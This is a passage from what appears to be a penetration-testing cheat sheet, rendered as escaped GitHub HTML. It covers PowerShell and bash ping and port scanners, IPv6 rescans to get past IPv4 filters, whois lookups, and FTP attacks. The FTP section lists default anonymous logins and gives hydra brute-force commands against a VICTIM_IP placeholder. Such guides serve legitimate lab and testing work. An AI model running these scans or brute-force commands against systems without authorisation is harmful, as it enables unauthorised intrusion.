class=\"pl-pds\"\u003e\"\u003c/span\u003eTCP port \u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e is open\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e} \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$null\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e limited ports to search\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003e22\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e25\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e80\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e135\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e139\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e445\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1443\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e3306\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e3389\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e5432\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e {echo ((\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e Net.Sockets.TcpClient).Connect(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eVICTIM_IP\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e)) \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eTCP port \u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e is open\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e} \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$null\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1.5 Bash Ping Scanner\u003c/h2\u003e\u003ca id=\"user-content-15-bash-ping-scanner\" class=\"anchor\" aria-label=\"Permalink: 1.5 Bash Ping Scanner\" href=\"#15-bash-ping-scanner\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePings all hosts in a /24 subnet. Provide any IP address in the subnet as arg.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"#!/bin/bash\naddr=${1:-10.1.1.0}\nsubnet=\u0026quot;${addr%.*}\u0026quot;\nfor i in {1..254}; do\n  host=\u0026quot;$subnet.$i\u0026quot;\n  ping -c1 -w1 $subnet.$i \u0026gt;\u0026amp; /dev/null \u0026amp;\u0026amp; echo \u0026quot;$host UP ++++\u0026quot; || echo \u0026quot;$host down\u0026quot; \u0026amp;\n  sleep 0.1 || break  # lets you Ctrl+C out of loop\ndone\nwait $(jobs -rp)\necho \u0026quot;Done\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#!\u003c/span\u003e/bin/bash\u003c/span\u003e\naddr=\u003cspan class=\"pl-smi\"\u003e${1\u003cspan class=\"pl-k\"\u003e:-\u003c/span\u003e10.1.1.0}\u003c/span\u003e\nsubnet=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e${addr\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e.\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e}\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003ei\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e {1..254}\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e\n  host=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$subnet\u003c/span\u003e.\u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n  ping -c1 -w1 \u003cspan class=\"pl-smi\"\u003e$subnet\u003c/span\u003e.\u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026amp;\u003c/span\u003e /dev/null \u003cspan class=\"pl-k\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$host\u003c/span\u003e UP ++++\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e||\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$host\u003c/span\u003e down\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e\n  sleep 0.1 \u003cspan class=\"pl-k\"\u003e||\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ebreak\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e lets you Ctrl+C out of loop\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003edone\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ewait\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ejobs -rp\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDone\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAnd here's a one-liner to do it in Windows:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# note: meant to be copy-pasted, not in .bat script (%i vs %%i)\nfor /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i | findstr \u0026quot;Reply\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e note: meant to be copy-pasted, not in .bat script (%i vs %%i)\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eL \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003ei \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e (\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e255\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e@ping\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003en \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ew \u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e10.2\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e.\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003ei \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eReply\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1.6 Bash Port Scanner\u003c/h2\u003e\u003ca id=\"user-content-16-bash-port-scanner\" class=\"anchor\" aria-label=\"Permalink: 1.6 Bash Port Scanner\" href=\"#16-bash-port-scanner\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eScans all 65535 ports of a single host. Provide host IP as arg. Only works on Linux systems using bash!\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"#!/bin/bash\nhost=${1}\nfor port in {1..65535}; do\n  timeout .5 bash -c \u0026quot;(echo -n \u0026gt; /dev/tcp/$host/$port) \u0026gt;\u0026amp; /dev/null\u0026quot; \u0026amp;\u0026amp;\n    echo \u0026quot;port $port is open\u0026quot; \u0026amp;\ndone\nwait $(jobs -rp)\necho \u0026quot;Done\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#!\u003c/span\u003e/bin/bash\u003c/span\u003e\nhost=\u003cspan class=\"pl-smi\"\u003e${1}\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eport\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e {1..65535}\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e\n  timeout .5 bash -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(echo -n \u0026gt; /dev/tcp/\u003cspan class=\"pl-smi\"\u003e$host\u003c/span\u003e/\u003cspan class=\"pl-smi\"\u003e$port\u003c/span\u003e) \u0026gt;\u0026amp; /dev/null\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e\n    \u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eport \u003cspan class=\"pl-smi\"\u003e$port\u003c/span\u003e is open\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003edone\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ewait\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ejobs -rp\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDone\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1.7 IPv6 to bypass IPv4 filters\u003c/h2\u003e\u003ca id=\"user-content-17-ipv6-to-bypass-ipv4-filters\" class=\"anchor\" aria-label=\"Permalink: 1.7 IPv6 to bypass IPv4 filters\" href=\"#17-ipv6-to-bypass-ipv4-filters\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSometimes if you see \u003ccode\u003efiltered\u003c/code\u003e on an nmap scan, the filter may only be applied on IPv4, but not IPv6. Try scanning it again using the host's IPv6 address.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# First take note of MAC address from nmap scan of device with 'filtered' port.\n# NOTE: nmap must be run as sudo to get MAC address.\n# If you don't have the MAC from nmap, you can probably get it from\n# your arp table with `arp -an`. If you have a hostname, you can\n# do a DNS lookup for the AAAA record.\n\n# get list of IPv6 neighbors on tun0 interface\nping6 -c2 ff02::1%tun0 \u0026gt;/dev/null\nip -6 n | grep -i MACADDR\n\n# Then rescan using nmap's IPv6 mode\nsudo nmap -6 -n -v -sC -sV -p FILTERED_PORT IPV6_ADDR\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e First take note of MAC address from nmap scan of device with 'filtered' port.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e NOTE: nmap must be run as sudo to get MAC address.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e If you don't have the MAC from nmap, you can probably get it from\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e your arp table with `arp -an`. If you have a hostname, you can\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e do a DNS lookup for the AAAA record.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get list of IPv6 neighbors on tun0 interface\u003c/span\u003e\nping6 -c2 ff02::1%tun0 \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e/dev/null\nip -6 n \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -i MACADDR\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Then rescan using nmap's IPv6 mode\u003c/span\u003e\nsudo nmap -6 -n -v -sC -sV -p FILTERED_PORT IPV6_ADDR\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere is another example of a script to try to get the link-local IPv6 address by building the EUI format from the MAC:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"#!/bin/bash -e\n# Usage: ./ipv4to6.sh 192.168.0.1\n# source: https://askubuntu.com/a/771914\n\nIP=$1\nping -c 1 $1 \u0026gt; /dev/null 2\u0026gt; /dev/null\nMAC=$(arp -an $1 | awk '{ print $4 }')\nIFACE=$(arp -an $1 | awk '{ print $7 }')\n\npython3 -c \u0026quot;\nfrom netaddr import IPAddress\nfrom netaddr.eui import EUI\nmac = EUI(\\\u0026quot;$MAC\\\u0026quot;)\nip = mac.ipv6(IPAddress('fe80::'))\nprint('{ip}%{iface}'.format(ip=ip, iface=\\\u0026quot;$IFACE\\\u0026quot;))\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#!\u003c/span\u003e/bin/bash -e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Usage: ./ipv4to6.sh 192.168.0.1\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e source: https://askubuntu.com/a/771914\u003c/span\u003e\n\nIP=\u003cspan class=\"pl-smi\"\u003e$1\u003c/span\u003e\nping -c 1 \u003cspan class=\"pl-smi\"\u003e$1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e /dev/null \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e /dev/null\nMAC=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003earp -an \u003cspan class=\"pl-smi\"\u003e$1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e awk \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e{ print $4 }\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\nIFACE=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003earp -an \u003cspan class=\"pl-smi\"\u003e$1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e awk \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e{ print $7 }\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\n\npython3 -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003efrom netaddr import IPAddress\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003efrom netaddr.eui import EUI\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003emac = EUI(\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$MAC\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003eip = mac.ipv6(IPAddress('fe80::'))\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003eprint('{ip}%{iface}'.format(ip=ip, iface=\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$IFACE\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e))\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e1.8 Whois\u003c/h2\u003e\u003ca id=\"user-content-18-whois\" class=\"anchor\" aria-label=\"Permalink: 1.8 Whois\" href=\"#18-whois\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePerform \u003ccode\u003ewhois\u003c/code\u003e lookups to get information about a domain name, such as the name server and registrar.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"whois megacorpone.com\n\n# optionally specify server to use for whois lookup\nwhois megacorpone.com -h $WHOIS_SERVER\n\n# perform a reverse lookup\nwhois 38.100.193.70\"\u003e\u003cpre\u003ewhois megacorpone.com\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e optionally specify server to use for whois lookup\u003c/span\u003e\nwhois megacorpone.com -h \u003cspan class=\"pl-smi\"\u003e$WHOIS_SERVER\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e perform a reverse lookup\u003c/span\u003e\nwhois 38.100.193.70\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2 Services\u003c/h1\u003e\u003ca id=\"user-content-2-services\" class=\"anchor\" aria-label=\"Permalink: 2 Services\" href=\"#2-services\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis section includes enumeration, exploitation, and interaction techniques for common services you might discover through scanning.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.1 FTP - 21\u003c/h2\u003e\u003ca id=\"user-content-21-ftp---21\" class=\"anchor\" aria-label=\"Permalink: 2.1 FTP - 21\" href=\"#21-ftp---21\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eAnonymous Logins:\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThese are checked by default with Nmap.\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eanonymous : anonymous\u003c/li\u003e\n\u003cli\u003eanonymous :\u003c/li\u003e\n\u003cli\u003eftp : ftp\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eBruteforce logins\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://VICTIM_IP\nhydra -P /usr/share/wordlists/rockyou.txt -l USER ftp://VICTIM_IP\nhydra -V -f -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -l USERNAME ftp://VICTIM_IP\"\u003e\u003cpre\u003ehydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://VICTIM_IP\nhydra -P /usr/share/wordlists/rockyou.txt -l USER ftp://VICTIM_IP\nhydra -V -f -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -l USERNAME ftp://VICTIM_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eConnecting \u0026amp; Interaction:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# ways to connect, in order of preference\nftp -A VICTIM_IP # '-A' forces active mode (not passive)\nnc -nvC VICTIM_IP 21\ntelnet VICTIM_IP 21\n\n# connect in your filesystem explorer:\n# (Chrome and Firefox removed FTP 